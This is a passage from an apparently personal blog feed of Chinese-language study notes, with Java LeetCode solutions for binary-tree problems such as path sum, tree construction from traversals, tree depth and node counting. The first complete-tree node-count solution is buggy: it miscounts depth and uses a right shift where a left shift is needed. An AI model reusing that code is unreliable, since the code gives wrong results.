class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exrloration</span><span class="params">(TreeNode node,<span class="type">int</span> deepth)</span> &#123;</span><br><span class="line">        <span class="comment">//其实题目描述已经避免这种情况了</span></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(deepth &gt; Deepth) &#123;</span><br><span class="line">                Deepth = deepth;</span><br><span class="line">                result = node.val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">               exrloration(node.left,deepth+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">               <span class="keyword">if</span>(node.right!= <span class="literal">null</span>) &#123;</span><br><span class="line">               exrloration(node.right,deepth+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="路径总和"><a href="#路径总和" class="headerlink" title="路径总和"></a>路径总和</h4><p>link：<a href="https://leetcode.cn/problems/path-sum/description/">112. 路径总和 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>类似数组遍历求和（滑动窗口）找目标总和值只不过换成二叉树.<br>首先还是想到按照前序遍历的方式，递归遍历.由于根节点是一定要选中的，(null另算)那我们遍历子节点做差判断最后是否等于0即可.<br>或者可以从下向上按照层，借助队列实现二叉树版滑动窗口.🤔</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        <span class="comment">//特殊情况优先</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        targetSum -= root.val;</span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> targetSum == <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">left</span> <span class="operator">=</span> hasPathSum(root.left,targetSum);</span><br><span class="line">            <span class="comment">//剪枝判断</span></span><br><span class="line">            <span class="keyword">if</span>(left) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(root.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">right</span> <span class="operator">=</span> hasPathSum(root.right,targetSum);</span><br><span class="line">            <span class="keyword">if</span>(right) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从中序和后序遍历构造二叉树"><a href="#从中序和后序遍历构造二叉树" class="headerlink" title="从中序和后序遍历构造二叉树"></a>从中序和后序遍历构造二叉树</h4><p>link：<a href="https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/description/">106. 从中序与后序遍历序列构造二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>其实和我们数据结构考试中的内容一致，画图推推规律.<br><img src="/../imgs/2024-10/image-20241112100932554.png" alt="image-20241112100932554"></p><p><img src="/../imgs/2024-10/image-20241112101050227.png" alt="image-20241112101050227"></p><p>根据画图规律可得 后续遍历中root位置出现在最后一个位置，再结合中序遍历可以得出9为左子树，15、20、7为右子树.<br>我使用Map进行解决,key存储值，value存储下标.<br>中序遍历中root的index + 1.<br>根据之前分析的规律，我们利用后序遍历确定root.value，然后对应在中序遍历中定位到root位置（利用index）然后回溯到中序遍历切割出左子树那么在后序遍历中剩余的部分就是右子树.</p><h6 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    Map&lt;Integer,Integer&gt; map;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;inorder.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            map.put(inorder[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> FindOrder(inorder,<span class="number">0</span>,inorder.length,postorder,<span class="number">0</span>,postorder.length);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">FindOrder</span><span class="params">(<span class="type">int</span>[] inOrder,<span class="type">int</span> inBegin,<span class="type">int</span> inEnd,<span class="type">int</span>[] postOrder,<span class="type">int</span> postBegin,<span class="type">int</span> postEnd)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//结束条件,左闭右开</span></span><br><span class="line">        <span class="keyword">if</span>(inBegin&gt;=inEnd || postBegin&gt;=postEnd)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找到后序在中序的位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> map.get(postOrder[postEnd - <span class="number">1</span>]);</span><br><span class="line">        <span class="comment">//构造节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(inOrder[index]);</span><br><span class="line">        <span class="comment">//保存中序左子树的个数,用来确定后序的区间</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">lenOfLeft</span> <span class="operator">=</span> index - inBegin;</span><br><span class="line">        root.left = FindOrder(inOrder,inBegin,index,postOrder,postBegin,postBegin+lenOfLeft);</span><br><span class="line">        root.right = FindOrder(inOrder,index+<span class="number">1</span>,inEnd,postOrder,postBegin+lenOfLeft,postEnd-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> postIndex;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line"></span><br><span class="line">        postIndex = postorder.length-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buildTreeChild(postorder,inorder,<span class="number">0</span>,inorder.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">buildTreeChild</span><span class="params">(<span class="type">int</span>[] postorder,<span class="type">int</span>[] inorder,<span class="type">int</span> inbegin,<span class="type">int</span> inend)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. 没有左树 或者 没有右树了</span></span><br><span class="line">        <span class="keyword">if</span>(inbegin &gt; inend) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.创建根节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(postorder[postIndex]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.从中序遍历当中 找到根节点所在的下标</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rootIndex</span> <span class="operator">=</span> findIndex(inorder,inbegin,inend,postorder[postIndex]);</span><br><span class="line">        <span class="keyword">if</span>(rootIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        postIndex--;</span><br><span class="line">        <span class="comment">//4. 创建左子树 和  右子树</span></span><br><span class="line"></span><br><span class="line">        root.right = buildTreeChild(postorder,inorder,rootIndex+<span class="number">1</span>,inend);</span><br><span class="line"></span><br><span class="line">        root.left = buildTreeChild(postorder,inorder,inbegin,rootIndex-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">findIndex</span><span class="params">(<span class="type">int</span>[] inorder,<span class="type">int</span> inbegin,<span class="type">int</span> inend,<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> inbegin;i &lt;= inend;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[i] == key) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><h3 id="理解构建过程的示例"><a href="#理解构建过程的示例" class="headerlink" title="理解构建过程的示例"></a>理解构建过程的示例</h3><p>以中序遍历 <code>inorder = [9, 3, 15, 20, 7]</code> 和后序遍历 <code>postorder = [9, 15, 7, 20, 3]</code> 为例：</p><ol><li><strong>第一次调用</strong>：<ul><li><code>postIndex</code> 指向 <code>3</code>，创建根节点 <code>3</code>.</li><li>在中序数组中找到 <code>3</code> 的索引为 <code>1</code>.</li><li>右子树范围 <code>[15, 20, 7]</code>，左子树范围 <code>[9]</code>.</li></ul></li><li><strong>构建右子树</strong>：<ul><li>递归调用构建右子树，<code>postIndex</code> 现在指向 <code>20</code>，创建节点 <code>20</code>.</li><li>在中序数组中找到 <code>20</code> 的索引为 <code>3</code>.</li></ul></li><li><strong>构建左子树（对于 <code>20</code>）</strong>：<ul><li>继续递归构建右子树（此时后序的下一节点是 <code>7</code>）.</li><li>处理完 <code>20</code> 的右子树后，回溯到 <code>20</code>，然后处理 <code>20</code> 的左子树（为 <code>15</code>）.</li></ul></li><li><strong>构建左子树（对于 <code>3</code>）</strong>：<ul><li>现在回到根节点 <code>3</code>，处理左子树（此时后序的下一节点是 <code>9</code>）.</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;找树左下角的值&quot;&gt;&lt;a href=&quot;#找树左下角的值&quot; class=&quot;headerlink&quot; title=&quot;找树左下角的值&quot;&gt;&lt;/a&gt;找树左下角的值&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/find-bo</summary>
      
    
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x11</title>
    <link href="https://yubut.github.io/2024/11/09/yub%E3%81%AEAlgorithm.0x11/"/>
    <id>https://yubut.github.io/2024/11/09/yub%E3%81%AEAlgorithm.0x11/</id>
    <published>2024-11-09T12:23:53.000Z</published>
    <updated>2024-11-12T14:15:44.166Z</updated>
    
    <content type="html"><![CDATA[<h4 id="二叉树的最大深度"><a href="#二叉树的最大深度" class="headerlink" title="二叉树的最大深度"></a>二叉树的最大深度</h4><p>link：<a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/description/">104. 二叉树的最大深度 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>高度：后序遍历<br>深度：前序遍历<br>但是其实这里我们可以选择后序遍历，根节点的高度就是树的深度.</p><p><img src="/../imgs/2024-10/image-20241109214025557.png" alt="image-20241109214025557"></p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getHeight(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(node.right);</span><br><span class="line">        <span class="type">int</span> <span class="variable">height</span> <span class="operator">=</span> leftHeight &gt; rightHeight ? leftHeight + <span class="number">1</span> : rightHeight + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> height;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉树的最小深度"><a href="#二叉树的最小深度" class="headerlink" title="二叉树的最小深度"></a>二叉树的最小深度</h4><p>link:<a href="https://leetcode.cn/problems/minimum-depth-of-binary-tree/description/">111. 二叉树的最小深度 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>和上题的思路基本一致，但是注意不是把最大值改成最小值.<br>自己画图分析一下有哪些情况，还是之前讲的特殊情况优先考虑.<br>按照我们上一题的思路，针对左子树只有一个节点，但右子树有至少一层分支的基础上，最小深度就不会是1了.</p><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> getHeight(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(node.right);</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="literal">null</span> &amp;&amp; node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> rightHeight + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> leftHeight + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> leftHeight&gt;rightHeight?rightHeight+<span class="number">1</span>:leftHeight+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完全二叉树节点个数"><a href="#完全二叉树节点个数" class="headerlink" title="完全二叉树节点个数"></a>完全二叉树节点个数</h4><p>link：<a href="https://leetcode.cn/problems/count-complete-tree-nodes/submissions/">222. 完全二叉树的节点个数 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>首先想到的是在之前深度的基础上，遍历计数节点，利用完全二叉树的性质，左子树的高度一定是大于等于右子树的高度，所以我们遍历只需要判断左子树就行.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getNum(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> node.left;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> node.right;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(right != <span class="literal">null</span>) &#123;</span><br><span class="line">            right = right.right;</span><br><span class="line">            leftDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(left != <span class="literal">null</span>) &#123;</span><br><span class="line">            left = left.left;</span><br><span class="line">            leftDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(leftDepth == rightDepth) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">2</span> &gt;&gt; leftDepth) - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftnum</span> <span class="operator">=</span> getNum(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightnum</span> <span class="operator">=</span> getNum(node.right);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> leftnum + rightnum + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优化版</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getNumber(root);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNumber</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算左子树的深度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> getDepth(node.left);</span><br><span class="line">        <span class="comment">// 计算右子树的深度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> getDepth(node.right);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 